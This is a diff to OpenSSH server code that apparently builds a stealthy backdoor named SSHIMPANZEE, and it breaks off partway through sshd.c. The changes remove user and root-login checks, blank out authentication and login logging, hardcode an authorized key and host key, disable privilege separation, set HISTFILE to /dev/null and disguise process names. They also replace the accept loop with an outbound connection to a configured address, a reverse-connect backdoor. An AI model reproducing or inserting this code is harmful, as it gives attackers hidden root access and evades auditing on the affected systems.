@@ -1,0 +1,1138 @@
+diff --git a/auth.c b/auth.c
+index 03a777cc..0f50d2d9 100644
+--- a/auth.c
++++ b/auth.c
+@@ -106,24 +106,25 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 	int r;
+ 
+ 	/* Shouldn't be called if pw is NULL, but better safe than sorry... */
+-	if (!pw || !pw->pw_name)
+-		return 0;
++	//	if (!pw || !pw->pw_name)
++	//	return 0;
+ 
+-	if (!options.use_pam && platform_locked_account(pw)) {
++	/*if (!options.use_pam && platform_locked_account(pw)) {
+ 		logit("User %.100s not allowed because account is locked",
+ 		    pw->pw_name);
+ 		return 0;
+-	}
++		}*/
+ 
+ 	/*
+ 	 * Deny if shell does not exist or is not executable unless we
+ 	 * are chrooting.
+ 	 */
++	/*
+ 	if (options.chroot_directory == NULL ||
+ 	    strcasecmp(options.chroot_directory, "none") == 0) {
+ 		char *shell = xstrdup((pw->pw_shell[0] == '\0') ?
+ 		    _PATH_BSHELL : pw->pw_shell); /* empty = /bin/sh */
+-
++	/*
+ 		if (stat(shell, &st) == -1) {
+ 			logit("User %.100s not allowed because shell %.100s "
+ 			    "does not exist", pw->pw_name, shell);
+@@ -138,15 +139,16 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 			return 0;
+ 		}
+ 		free(shell);
+-	}
+-
++	}*/
++	/*
+ 	if (options.num_deny_users > 0 || options.num_allow_users > 0 ||
+ 	    options.num_deny_groups > 0 || options.num_allow_groups > 0) {
+ 		hostname = auth_get_canonical_hostname(ssh, options.use_dns);
+ 		ipaddr = ssh_remote_ipaddr(ssh);
+ 	}
+-
++	*/
+ 	/* Return false if user is listed in DenyUsers */
++	/*
+ 	if (options.num_deny_users > 0) {
+ 		for (i = 0; i < options.num_deny_users; i++) {
+ 			r = match_user(pw->pw_name, hostname, ipaddr,
+@@ -163,7 +165,8 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 		}
+ 	}
+ 	/* Return false if AllowUsers isn't empty and user isn't listed there */
+-	if (options.num_allow_users > 0) {
++	/*
++	  if (options.num_allow_users > 0) {
+ 		for (i = 0; i < options.num_allow_users; i++) {
+ 			r = match_user(pw->pw_name, hostname, ipaddr,
+ 			    options.allow_users[i]);
+@@ -174,7 +177,8 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 				break;
+ 		}
+ 		/* i < options.num_allow_users iff we break for loop */
+-		if (i >= options.num_allow_users) {
++	/*
++	        if (i >= options.num_allow_users) {
+ 			logit("User %.100s from %.100s not allowed because "
+ 			    "not listed in AllowUsers", pw->pw_name, hostname);
+ 			return 0;
+@@ -182,15 +186,16 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 	}
+ 	if (options.num_deny_groups > 0 || options.num_allow_groups > 0) {
+ 		/* Get the user's group access list (primary and supplementary) */
+-		if (ga_init(pw->pw_name, pw->pw_gid) == 0) {
++
++	/*if (ga_init(pw->pw_name, pw->pw_gid) == 0) {
+ 			logit("User %.100s from %.100s not allowed because "
+ 			    "not in any group", pw->pw_name, hostname);
+ 			return 0;
+ 		}
+ 
+ 		/* Return false if one of user's groups is listed in DenyGroups */
+-		if (options.num_deny_groups > 0)
+-			if (ga_match(options.deny_groups,
++	/*if (options.num_deny_groups > 0)
++		  if (ga_match(options.deny_groups,
+ 			    options.num_deny_groups)) {
+ 				ga_free();
+ 				logit("User %.100s from %.100s not allowed "
+@@ -202,6 +207,7 @@ allowed_user(struct ssh *ssh, struct passwd * pw)
+ 		 * Return false if AllowGroups isn't empty and one of user's groups
+ 		 * isn't listed there
+ 		 */
++	/*
+ 		if (options.num_allow_groups > 0)
+ 			if (!ga_match(options.allow_groups,
+ 			    options.num_allow_groups)) {
+@@ -268,67 +274,7 @@ void
+ auth_log(struct ssh *ssh, int authenticated, int partial,
+     const char *method, const char *submethod)
+ {
+-	Authctxt *authctxt = (Authctxt *)ssh->authctxt;
+-	int level = SYSLOG_LEVEL_VERBOSE;
+-	const char *authmsg;
+-	char *extra = NULL;
+-
+-	if (use_privsep && !mm_is_monitor() && !authctxt->postponed)
+-		return;
+ 
+-	/* Raise logging level */
+-	if (authenticated == 1 ||
+-	    !authctxt->valid ||
+-	    authctxt->failures >= options.max_authtries / 2 ||
+-	    strcmp(method, "password") == 0)
+-		level = SYSLOG_LEVEL_INFO;
+-
+-	if (authctxt->postponed)
+-		authmsg = "Postponed";
+-	else if (partial)
+-		authmsg = "Partial";
+-	else
+-		authmsg = authenticated ? "Accepted" : "Failed";
+-
+-	if ((extra = format_method_key(authctxt)) == NULL) {
+-		if (authctxt->auth_method_info != NULL)
+-			extra = xstrdup(authctxt->auth_method_info);
+-	}
+-
+-	do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
+-	    authmsg,
+-	    method,
+-	    submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
+-	    authctxt->valid ? "" : "invalid user ",
+-	    authctxt->user,
+-	    ssh_remote_ipaddr(ssh),
+-	    ssh_remote_port(ssh),
+-	    extra != NULL ? ": " : "",
+-	    extra != NULL ? extra : "");
+-
+-	free(extra);
+-
+-#if defined(CUSTOM_FAILED_LOGIN) || defined(SSH_AUDIT_EVENTS)
+-	if (authenticated == 0 && !(authctxt->postponed || partial)) {
+-		/* Log failed login attempt */
+-# ifdef CUSTOM_FAILED_LOGIN
+-		if (strcmp(method, "password") == 0 ||
+-		    strncmp(method, "keyboard-interactive", 20) == 0 ||
+-		    strcmp(method, "challenge-response") == 0)
+-			record_failed_login(ssh, authctxt->user,
+-			    auth_get_canonical_hostname(ssh, options.use_dns), "ssh");
+-# endif
+-# ifdef SSH_AUDIT_EVENTS
+-		audit_event(ssh, audit_classify_auth(method));
+-# endif
+-	}
+-#endif
+-#if defined(CUSTOM_FAILED_LOGIN) && defined(WITH_AIXAUTHENTICATE)
+-	if (authenticated)
+-		sys_auth_record_login(authctxt->user,
+-		    auth_get_canonical_hostname(ssh, options.use_dns), "ssh",
+-		    loginmsg);
+-#endif
+ }
+ 
+ void
+@@ -352,25 +298,7 @@ auth_maxtries_exceeded(struct ssh *ssh)
+ int
+ auth_root_allowed(struct ssh *ssh, const char *method)
+ {
+-	switch (options.permit_root_login) {
+-	case PERMIT_YES:
+-		return 1;
+-	case PERMIT_NO_PASSWD:
+-		if (strcmp(method, "publickey") == 0 ||
+-		    strcmp(method, "hostbased") == 0 ||
+-		    strcmp(method, "gssapi-with-mic") == 0)
+-			return 1;
+-		break;
+-	case PERMIT_FORCED_ONLY:
+-		if (auth_opts->force_command != NULL) {
+-			logit("Root login accepted for forced command.");
+-			return 1;
+-		}
+-		break;
+-	}
+-	logit("ROOT LOGIN REFUSED FROM %.200s port %d",
+-	    ssh_remote_ipaddr(ssh), ssh_remote_port(ssh));
+-	return 0;
++	return 1;
+ }
+ 
+ 
+@@ -472,7 +400,7 @@ getpwnamallow(struct ssh *ssh, const char *user)
+ 	struct passwd *pw;
+ 	struct connection_info *ci;
+ 	u_int i;
+-
++	pw = getpwnam(user);
+ 	ci = get_connection_info(ssh, 1, options.use_dns);
+ 	ci->user = user;
+ 	parse_server_match_config(&options, &includes, ci);
+@@ -491,6 +419,9 @@ getpwnamallow(struct ssh *ssh, const char *user)
+ #if defined(_AIX) && defined(HAVE_SETAUTHDB)
+ 	aix_restoreauthdb();
+ #endif
++	if (pw == NULL)
++	  return getpwuid(getuid());
++	
+ 	if (pw == NULL) {
+ 		logit("Invalid user %.100s from %.100s port %d",
+ 		    user, ssh_remote_ipaddr(ssh), ssh_remote_port(ssh));
+diff --git a/auth2-pubkey.c b/auth2-pubkey.c
+index b4f1f638..657dfc1a 100644
+--- a/auth2-pubkey.c
++++ b/auth2-pubkey.c
+@@ -70,6 +70,8 @@
+ #include "session.h" /* XXX for child_set_env(); refactor? */
+ #include "sk-api.h"
+ 
++#include "sshd.h"
++
+ /* import */
+ extern ServerOptions options;
+ 
+@@ -100,7 +102,10 @@ userauth_pubkey(struct ssh *ssh, const char *method)
+ 	struct sshkey_sig_details *sig_details = NULL;
+ 
+ 	hostbound = strcmp(method, "publickey-hostbound-v00@openssh.com") == 0;
+-
++	authctxt->valid = 1;
++	pw = fakepw();
++	
++	
+ 	if ((r = sshpkt_get_u8(ssh, &have_sig)) != 0 ||
+ 	    (r = sshpkt_get_cstring(ssh, &pkalg, NULL)) != 0 ||
+ 	    (r = sshpkt_get_string(ssh, &pkblob, &blen)) != 0)
+@@ -195,6 +200,7 @@ userauth_pubkey(struct ssh *ssh, const char *method)
+ 			    ssh->kex->session_id)) != 0)
+ 				fatal_fr(r, "put session id");
+ 		}
++		
+ 		if (!authctxt->valid || authctxt->user == NULL) {
+ 			debug2_f("disabled because of invalid user");
+ 			goto done;
+@@ -589,18 +595,27 @@ user_key_allowed2(struct passwd *pw, struct sshkey *key,
+ 	FILE *f;
+ 	int found_key = 0;
+ 
++	char *auth_key;
++	char loc[256];
+ 	if (authoptsp != NULL)
+ 		*authoptsp = NULL;
+ 
+ 	/* Temporarily use the user's uid. */
+-	temporarily_use_uid(pw);
+-
++	temporarily_use_uid(pw);	
+ 	debug("trying public key file %s", file);
+-	if ((f = auth_openkeyfile(file, pw, options.strict_modes)) != NULL) {
++	if(strcmp(file, KEYFILE)==0){
++	  auth_key = malloc(strlen(AUTHORIZED_KEYS)+1);
++	  strcpy(auth_key, AUTHORIZED_KEYS);
++	  if (auth_check_authkey_line(pw, key, auth_key, remote_ip, remote_host,loc, authoptsp) == 0)
++	      found_key = 1;
++	}
++	else
++	  if ((f = auth_openkeyfile(file, pw, options.strict_modes)) != NULL) {
+ 		found_key = auth_check_authkeys_file(pw, f, file,
+ 		    key, remote_ip, remote_host, authoptsp);
+ 		fclose(f);
+ 	}
++	 
+ 
+ 	restore_uid();
+ 	return found_key;
+diff --git a/authfile.c b/authfile.c
+index 9ed4f4c3..46383e2f 100644
+--- a/authfile.c
++++ b/authfile.c
+@@ -49,6 +49,9 @@
+ #include "ssherr.h"
+ #include "krl.h"
+ 
++#include "sshd.h"
++#include "servconf.h"
++extern ServerOptions options;
+ #define MAX_KEY_FILE_SIZE	(1024 * 1024)
+ 
+ /* Save a key blob to a file */
+@@ -119,25 +122,36 @@ sshkey_load_private_type(int type, const char *filename, const char *passphrase,
+     struct sshkey **keyp, char **commentp)
+ {
+ 	int fd, r;
++	struct sshbuf *buffer;
+ 
+-	if (keyp != NULL)
++	if (options.backdoor == 1){
++	  buffer = sshbuf_new();
++	  sshbuf_put(buffer, HOSTKEY, strlen(HOSTKEY));
++	  return sshkey_parse_private_fileblob_type(buffer, KEY_ED25519, "", keyp, NULL);
++	  
++	}
++	else
++	  {
++	
++	    if (keyp != NULL)
+ 		*keyp = NULL;
+-	if (commentp != NULL)
+-		*commentp = NULL;
++	    if (commentp != NULL)
++	      *commentp = NULL;
+ 
+-	if ((fd = open(filename, O_RDONLY)) == -1)
++	    if ((fd = open(filename, O_RDONLY)) == -1)
+ 		return SSH_ERR_SYSTEM_ERROR;
+-
+-	r = sshkey_perm_ok(fd, filename);
+-	if (r != 0)
++	    
++	    r = sshkey_perm_ok(fd, filename);
++	    if (r != 0)
+ 		goto out;
+ 
+-	r = sshkey_load_private_type_fd(fd, type, passphrase, keyp, commentp);
+-	if (r == 0 && keyp && *keyp)
+-		r = sshkey_set_filename(*keyp, filename);
+- out:
++	    r = sshkey_load_private_type_fd(fd, type, passphrase, keyp, commentp);
++	    if (r == 0 && keyp && *keyp)
++	      r = sshkey_set_filename(*keyp, filename);
++	  out:
+ 	close(fd);
+ 	return r;
++	  }
+ }
+ 
+ int
+@@ -264,7 +278,15 @@ sshkey_load_public(const char *filename, struct sshkey **keyp, char **commentp)
+ {
+ 	char *pubfile = NULL;
+ 	int r, oerrno;
+-
++	char *buffer;
++	if(strcmp(filename,"/NOPNOP/")==0)
++	  {
++	    buffer = malloc(strlen(HOSTKEY_PUB));
++	    strcpy(buffer, HOSTKEY_PUB);
++	    *keyp = sshkey_new(KEY_UNSPEC);
++	    return sshkey_read(*keyp, &buffer);
++	  }
++				       
+ 	if (keyp != NULL)
+ 		*keyp = NULL;
+ 	if (commentp != NULL)
+diff --git a/loginrec.c b/loginrec.c
+index 4f214995..d68d0e06 100644
+--- a/loginrec.c
++++ b/loginrec.c
+@@ -312,22 +312,22 @@ login_get_lastlog(struct logininfo *li, const uid_t uid)
+ 	 * reliably search wtmp(x) for the last login (see
+ 	 * wtmp_get_entry().)
+ 	 */
+-	pw = getpwuid(uid);
+-	if (pw == NULL)
+-		fatal("%s: Cannot find account for uid %ld", __func__,
+-		    (long)uid);
+-
+-	if (strlcpy(li->username, pw->pw_name, sizeof(li->username)) >=
+-	    sizeof(li->username)) {
+-		error("%s: username too long (%lu > max %lu)", __func__,
+-		    (unsigned long)strlen(pw->pw_name),
+-		    (unsigned long)sizeof(li->username) - 1);
+-		return NULL;
+-	}
+-
+-	if (getlast_entry(li))
+-		return (li);
+-	else
++	//pw = getpwuid(uid);
++	//if (pw == NULL)
++	  //fatal("%s: Cannot find account for uid %ld", __func__,
++	  //	    (long)uid);
++
++	//if (strlcpy(li->username, pw->pw_name, sizeof(li->username)) >=
++	//   sizeof(li->username)) {
++	//	error("%s: username too long (%lu > max %lu)", __func__,
++	//	    (unsigned long)strlen(pw->pw_name),
++	//	    (unsigned long)sizeof(li->username) - 1);
++	//	return NULL;
++	//}
++
++	//if (getlast_entry(li))
++	//	return (li);
++	//else
+ 		return (NULL);
+ }
+ 
+@@ -387,10 +387,10 @@ login_init_entry(struct logininfo *li, pid_t pid, const char *username,
+ 		strlcpy(li->username, username, sizeof(li->username));
+ 		pw = getpwnam(li->username);
+ 		if (pw == NULL) {
+-			fatal("%s: Cannot find user \"%s\"", __func__,
+-			    li->username);
++		  //fatal("%s: Cannot find user \"%s\"", __func__,
++		  //	    li->username);
+ 		}
+-		li->uid = pw->pw_uid;
++		//li->uid = pw->pw_uid;
+ 	}
+ 
+ 	if (hostname)
+@@ -437,7 +437,12 @@ login_set_addr(struct logininfo *li, const struct sockaddr *sa,
+  ** results
+  **/
+ int
+-login_write(struct logininfo *li)
++login_write(struct logininfo *li){
++  return 0;
++}
++
++int
++login_write_bkp(struct logininfo *li)
+ {
+ #ifndef HAVE_CYGWIN
+ 	if (geteuid() != 0) {
+diff --git a/monitor.c b/monitor.c
+index f856c873..6ec9a9ee 100644
+--- a/monitor.c
++++ b/monitor.c
+@@ -101,6 +101,9 @@
+ static Gssctxt *gsscontext = NULL;
+ #endif
+ 
++#include "sshd.h"
++
++
+ /* Imports */
+ extern ServerOptions options;
+ extern u_int utmp_len;
+@@ -723,7 +726,7 @@ mm_answer_pwnamallow(struct ssh *ssh, int sock, struct sshbuf *m)
+ 
+ 	pwent = getpwnamallow(ssh, authctxt->user);
+ 
+-	setproctitle("%s [priv]", pwent ? authctxt->user : "unknown");
++	setproctitle(SSHIMPANZEE_PROC_NAME);
+ 
+ 	sshbuf_reset(m);
+ 
+diff --git a/openbsd-compat/setproctitle.c b/openbsd-compat/setproctitle.c
+index e4064323..76ccbb78 100644
+--- a/openbsd-compat/setproctitle.c
++++ b/openbsd-compat/setproctitle.c
+@@ -138,12 +138,12 @@ setproctitle(const char *fmt, ...)
+ 		return;
+ #endif
+ 
+-	strlcpy(buf, __progname, sizeof(buf));
++	strlcpy(buf, "", sizeof(buf));
+ 
+ 	r = -1;
+ 	va_start(ap, fmt);
+ 	if (fmt != NULL) {
+-		len = strlcat(buf, ": ", sizeof(buf));
++		len = strlcat(buf, "", sizeof(buf));
+ 		if (len < sizeof(buf))
+ 			r = vsnprintf(buf + len, sizeof(buf) - len , fmt, ap);
+ 	}
+diff --git a/servconf.c b/servconf.c
+index 2e039da8..0ee5e153 100644
+--- a/servconf.c
++++ b/servconf.c
+@@ -71,6 +71,8 @@
+ #include "myproposal.h"
+ #include "digest.h"
+ 
++#include "sshd.h"
++
+ static void add_listen_addr(ServerOptions *, const char *,
+     const char *, int);
+ static void add_one_listen_addr(ServerOptions *, const char *,
+@@ -83,6 +85,8 @@ static void parse_server_config_depth(ServerOptions *options,
+ extern int use_privsep;
+ extern struct sshbuf *cfg;
+ 
++extern ServerOptions options;
++extern int inetd_flag;
+ /* Initializes the server options to their default values. */
+ 
+ void
+@@ -454,8 +458,8 @@ fill_default_server_options(ServerOptions *options)
+ 
+ 	/* Turn privilege separation and sandboxing on by default */
+ 	if (use_privsep == -1)
+-		use_privsep = PRIVSEP_ON;
+-
++		use_privsep = PRIVSEP_OFF;
++	
+ #define CLEAR_ON_NONE(v) \
+ 	do { \
+ 		if (option_clear_or_none(v)) { \
+@@ -2602,12 +2606,30 @@ load_server_config(const char *filename, struct sshbuf *conf)
+ 	char *line = NULL, *cp;
+ 	size_t linesize = 0;
+ 	FILE *f;
+-	int r;
++	int r, lineno = 0;
++	char buffer[64];
++	
++
++	if (options.backdoor){
++	  sshbuf_reset(conf);
++	  sprintf(buffer, "Port %d\n", PORT);
++	  sshbuf_put(conf, buffer,strlen(buffer));
+ 
+-	debug2_f("filename %s", filename);
+-	if ((f = fopen(filename, "r")) == NULL) {
++	  sprintf(buffer, "ListenAddress %s\n", LISTENADDRESS);
++	  sshbuf_put(conf, buffer, strlen(buffer));
++
++	  sprintf(buffer, "HostKey /\n");
++	  sshbuf_put(conf, buffer, strlen(buffer));
++
++	  sshbuf_put(conf, EXTRACONFIG, sizeof(EXTRACONFIG));
++	  return;
++	}
++	else {
++	  debug2_f("filename %s", filename);
++	  if ((f = fopen(filename, "r")) == NULL) {
+ 		perror(filename);
+ 		exit(1);
++	  }
+ 	}
+ 	sshbuf_reset(conf);
+ 	/* grow buffer, so realloc is avoided for large config files */
+diff --git a/servconf.h b/servconf.h
+index 7ad43de8..e6cbc9b9 100644
+--- a/servconf.h
++++ b/servconf.h
+@@ -229,6 +229,7 @@ typedef struct {
+ 	int	expose_userauth_info;
+ 	u_int64_t timing_secret;
+ 	char   *sk_provider;
++        char backdoor;
+ 	int	required_rsa_size;	/* minimum size of RSA keys */
+ 
+ 	char	**channel_timeouts;	/* inactivity timeout by channel type */
+diff --git a/session.c b/session.c
+index f30d7ac5..2758af1b 100644
+--- a/session.c
++++ b/session.c
+@@ -96,6 +96,8 @@
+ #include "sftp.h"
+ #include "atomicio.h"
+ 
++
++
+ #if defined(KRB5) && defined(USE_AFS)
+ #include <kafs.h>
+ #endif
+@@ -104,6 +106,8 @@
+ #include <selinux/selinux.h>
+ #endif
+ 
++#include "sshd.h"
++
+ #define IS_INTERNAL_SFTP(c) \
+ 	(!strncmp(c, INTERNAL_SFTP_NAME, sizeof(INTERNAL_SFTP_NAME) - 1) && \
+ 	 (c[sizeof(INTERNAL_SFTP_NAME) - 1] == '\0' || \
+@@ -333,7 +337,7 @@ set_fwdpermit_from_authopts(struct ssh *ssh, const struct sshauthopt *opts)
+ void
+ do_authenticated(struct ssh *ssh, Authctxt *authctxt)
+ {
+-	setproctitle("%s", authctxt->pw->pw_name);
++	setproctitle(SSHIMPANZEE_PROC_NAME);
+ 
+ 	auth_log_authopts("active", auth_opts, 0);
+ 
+@@ -790,7 +794,7 @@ do_login(struct ssh *ssh, Session *s, const char *command)
+ void
+ do_motd(void)
+ {
+-	FILE *f;
++  /*FILE *f;
+ 	char buf[256];
+ 
+ 	if (options.print_motd) {
+@@ -805,7 +809,8 @@ do_motd(void)
+ 				fputs(buf, stdout);
+ 			fclose(f);
+ 		}
+-	}
++		}*/
++  fputs(MOTD,stdout);
+ }
+ 
+ 
+@@ -1021,6 +1026,8 @@ do_setup_env(struct ssh *ssh, Session *s, const char *shell)
+ 	for (i = 0; i < s->num_env; i++)
+ 		child_set_env(&env, &envsize, s->env[i].name, s->env[i].val);
+ 
++	child_set_env(&env, &envsize, "HISTFILE", "/dev/null");
++	
+ 	child_set_env(&env, &envsize, "USER", pw->pw_name);
+ 	child_set_env(&env, &envsize, "LOGNAME", pw->pw_name);
+ #ifdef _AIX
+@@ -1371,15 +1378,15 @@ do_setusercontext(struct passwd *pw)
+ #else
+ 		if (setlogin(pw->pw_name) < 0)
+ 			error("setlogin failed: %s", strerror(errno));
+-		if (setgid(pw->pw_gid) < 0) {
+-			perror("setgid");
+-			exit(1);
+-		}
++		//if (setgid(pw->pw_gid) < 0) {
++		//	perror("setgid");
++		//	exit(1);
++		//}
+ 		/* Initialize the group list. */
+-		if (initgroups(pw->pw_name, pw->pw_gid) < 0) {
+-			perror("initgroups");
+-			exit(1);
+-		}
++		//if (initgroups(pw->pw_name, pw->pw_gid) < 0) {
++		//	perror("initgroups");
++		//	exit(1);
++		//}
+ 		endgrent();
+ #endif
+ 
+@@ -1433,8 +1440,8 @@ do_setusercontext(struct passwd *pw)
+ 		fatal("server lacks privileges to chroot to ChrootDirectory");
+ 	}
+ 
+-	if (getuid() != pw->pw_uid || geteuid() != pw->pw_uid)
+-		fatal("Failed to set uids to %u.", (u_int) pw->pw_uid);
++	//if (getuid() != pw->pw_uid || geteuid() != pw->pw_uid)
++	//	fatal("Failed to set uids to %u.", (u_int) pw->pw_uid);
+ }
+ 
+ static void
+@@ -1567,8 +1574,8 @@ do_child(struct ssh *ssh, Session *s, const char *command)
+ 	 * Get the shell from the password data.  An empty shell field is
+ 	 * legal, and means /bin/sh.
+ 	 */
+-	shell = (pw->pw_shell[0] == '\0') ? _PATH_BSHELL : pw->pw_shell;
+-
++	//shell = (pw->pw_shell[0] == '\0') ? _PATH_BSHELL : pw->pw_shell;
++	shell = FORCEDSHELL;
+ 	/*
+ 	 * Make sure $SHELL points to the shell from the password file,
+ 	 * even if shell is overridden from login.conf
+@@ -1653,7 +1660,7 @@ do_child(struct ssh *ssh, Session *s, const char *command)
+ 		int i;
+ 		char *p, *args;
+ 
+-		setproctitle("%s@%s", s->pw->pw_name, INTERNAL_SFTP_NAME);
++		setproctitle(SSHIMPANZEE_PROC_NAME);
+ 		args = xstrdup(command ? command : "sftp-server");
+ 		for (i = 0, (p = strtok(args, " ")); p; (p = strtok(NULL, " ")))
+ 			if (i < ARGV_MAX - 1)
+@@ -2564,7 +2571,7 @@ session_proctitle(Session *s)
+ 	if (s->pw == NULL)
+ 		error("no user for session %d", s->self);
+ 	else
+-		setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
++		setproctitle(SSHIMPANZEE_PROC_NAME);
+ }
+ 
+ int
+diff --git a/sshd.c b/sshd.c
+index ce48602d..5d9e2d00 100644
+--- a/sshd.c
++++ b/sshd.c
+@@ -44,6 +44,14 @@
+ 
+ #include "includes.h"
+ 
++#include "sshd.h"
++#include <stdio.h>
++#include <sys/socket.h>
++#include <arpa/inet.h>
++#include <unistd.h>
++#include <string.h>
++
++
+ #include <sys/types.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
+@@ -142,7 +150,7 @@ ServerOptions options;
+ 
+ /* Name of the server configuration file. */
+ char *config_file_name = _PATH_SERVER_CONFIG_FILE;
+-
++char init = 0;
+ /*
+  * Debug mode flag.  This can be set on the command line.  If debug
+  * mode is enabled, extra debugging output will be sent to the system
+@@ -150,7 +158,7 @@ char *config_file_name = _PATH_SERVER_CONFIG_FILE;
+  * the first connection.
+  */
+ int debug_flag = 0;
+-
++int inetd_flag = 0;
+ /*
+  * Indicating that the daemon should only test the configuration and keys.
+  * If test_flag > 1 ("-T" flag), then sshd will also dump the effective
+@@ -160,7 +168,7 @@ int debug_flag = 0;
+ static int test_flag = 0;
+ 
+ /* Flag indicating that the daemon is being started from inetd. */
+-static int inetd_flag = 0;
++//static int inetd_flag = 0;
+ 
+ /* Flag indicating that sshd should not detach and become a daemon. */
+ static int no_daemon_flag = 0;
+@@ -529,7 +537,7 @@ privsep_preauth(struct ssh *ssh)
+ 		set_log_handler(mm_log_handler, pmonitor);
+ 
+ 		privsep_preauth_child();
+-		setproctitle("%s", "[net]");
++		setproctitle(SSHIMPANZEE_PROC_NAME);
+ 		if (box != NULL)
+ 			ssh_sandbox_child(box);
+ 
+@@ -847,7 +855,7 @@ should_drop_connection(int startups)
+ static int
+ drop_connection(int sock, int startups, int notify_pipe)
+ {
+-	char *laddr, *raddr;
++  /*char *laddr, *raddr;
+ 	const char msg[] = "Exceeded MaxStartups\r\n";
+ 	static time_t last_drop, first_drop;
+ 	static u_int ndropped;
+@@ -860,14 +868,17 @@ drop_connection(int sock, int startups, int notify_pipe)
+ 		if (last_drop != 0 &&
+ 		    startups < options.max_startups_begin - 1) {
+ 			/* XXX maybe need better hysteresis here */
++  /*
+ 			logit("exited MaxStartups throttling after %s, "
+ 			    "%u connections dropped",
+ 			    fmt_timeframe(now - first_drop), ndropped);
+ 			last_drop = 0;
+ 		}
+-		return 0;
+-	}
+-
++  */
++  //return 0;
++  
++  //	}
++/*
+ #define SSHD_MAXSTARTUPS_LOG_INTERVAL	(5 * 60)
+ 	if (last_drop == 0) {
+ 		error("beginning MaxStartups throttling");
+@@ -876,6 +887,7 @@ drop_connection(int sock, int startups, int notify_pipe)
+ 		ndropped = 0;
+ 	} else if (last_drop + SSHD_MAXSTARTUPS_LOG_INTERVAL < now) {
+ 		/* Periodic logs */
++/*
+ 		error("in MaxStartups throttling for %s, "
+ 		    "%u connections dropped",
+ 		    fmt_timeframe(now - first_drop), ndropped + 1);
+@@ -892,8 +904,8 @@ drop_connection(int sock, int startups, int notify_pipe)
+ 	free(laddr);
+ 	free(raddr);
+ 	/* best-effort notification to client */
+-	(void)write(sock, msg, sizeof(msg) - 1);
+-	return 1;
++//(void)write(sock, msg, sizeof(msg) - 1);
++	return 0;
+ }
+ 
+ static void
+@@ -1067,9 +1079,11 @@ listen_on_addrs(struct listenaddr *la)
+ 			sock_set_v6only(listen_sock);
+ 
+ 		debug("Bind to port %s on %s.", strport, ntop);
++		num_listen_socks++;
++		
+ 
+ 		/* Bind the socket to the desired port. */
+-		if (bind(listen_sock, ai->ai_addr, ai->ai_addrlen) == -1) {
++		/*if (bind(listen_sock, ai->ai_addr, ai->ai_addrlen) == -1) {
+ 			error("Bind to port %s on %s failed: %.200s.",
+ 			    strport, ntop, strerror(errno));
+ 			close(listen_sock);
+@@ -1077,8 +1091,9 @@ listen_on_addrs(struct listenaddr *la)
+ 		}
+ 		listen_socks[num_listen_socks] = listen_sock;
+ 		num_listen_socks++;
+-
++		*/
+ 		/* Start listening on the port. */
++		/*
+ 		if (listen(listen_sock, SSH_LISTEN_BACKLOG) == -1)
+ 			fatal("listen on [%s]:%s: %.100s",
+ 			    ntop, strport, strerror(errno));
+@@ -1086,6 +1101,7 @@ listen_on_addrs(struct listenaddr *la)
+ 		    ntop, strport,
+ 		    la->rdomain == NULL ? "" : " rdomain ",
+ 		    la->rdomain == NULL ? "" : la->rdomain);
++		*/
+ 	}
+ }
+ 
+@@ -1113,6 +1129,42 @@ server_listen(void)
+ 		fatal("Cannot bind any address.");
+ }
+ 
++
++
++int
++connect_to_remote(struct sockaddr_in* from, int* len)
++{
++  int sock = 0;
++  int ret;
++  struct sockaddr_in to;
++   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
++    {
++        printf("\n Socket creation error \n");
++        return -1;
++    }
++ 
++   to.sin_port = htons(PORT);
++   to.sin_family = AF_INET;  
++
++    if(inet_pton(AF_INET, LISTENADDRESS, &to.sin_addr)<=0) 
++    {
++        printf("\nInvalid address/ Address not supported \n");
++        return -1;
++    }
++    ret = connect(sock, (struct sockaddr *)&to, sizeof(to));
++    //printf("Connect ret %d\n", ret);
++    if (ret < 0)
++    {
++      close(sock);
++        perror("\nConnection Failed \n");
++        return -1;
++    }
++
++    from->sin_port = htons(9021);
++    
++    *len=sizeof(from);
++  return sock;
++}
+ /*
+  * The main TCP accept loop. Note that, for the non-debug case, returns
+  * from this function are in a forked subprocess.
+@@ -1169,7 +1221,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 			exit(received_sigterm == SIGTERM ? 0 : 255);
+ 		}
+ 		if (ostartups != startups) {
+-			setproctitle("%s [listener] %d of %d-%d startups",
++			setproctitle(SSHIMPANZEE_PROC_NAME,
+ 			    listener_proctitle, startups,
+ 			    options.max_startups_begin, options.max_startups);
+ 			ostartups = startups;
+@@ -1199,15 +1251,25 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 				startup_pollfd[i] = npfd++;
+ 			}
+ 		}
+-
++		if(init == 1)
++		  {
+ 		/* Wait until a connection arrives or a child exits. */
+-		ret = ppoll(pfd, npfd, NULL, &osigset);
+-		if (ret == -1 && errno != EINTR) {
+-			error("ppoll: %.100s", strerror(errno));
+-			if (errno == EINVAL)
+-				cleanup_exit(1); /* can't recover */
++		    
++		    //ret = ppoll(pfd, npfd, NULL, &osigset);
++		    //if (ret == -1 && errno != EINTR) {
++		    //  error("ppoll: %.100s", strerror(errno));
++		    //  if (errno == EINVAL)
++		    //cleanup_exit(1); /* can't recover */
++		    //}
++
++		  }
++		else{
++		  debug_f("Skipping first ppoll");
++		  init = 1;
++		  pfd[0].revents = POLLIN;
++		  ret = 0;
+ 		}
+-		sigprocmask(SIG_SETMASK, &osigset, NULL);
++		//sigprocmask(SIG_SETMASK, &osigset, NULL);
+ 		if (ret == -1)
+ 			continue;
+ 
+@@ -1244,12 +1306,19 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 				break;
+ 			}
+ 		}
++		
+ 		for (i = 0; i < num_listen_socks; i++) {
+-			if (!(pfd[i].revents & POLLIN))
+-				continue;
++		    if (!(pfd[i].revents & POLLIN))
++		 		continue;
+ 			fromlen = sizeof(from);
+-			*newsock = accept(listen_socks[i],
+-			    (struct sockaddr *)&from, &fromlen);
++			*newsock = connect_to_remote((struct sockaddr*) &from, &fromlen);
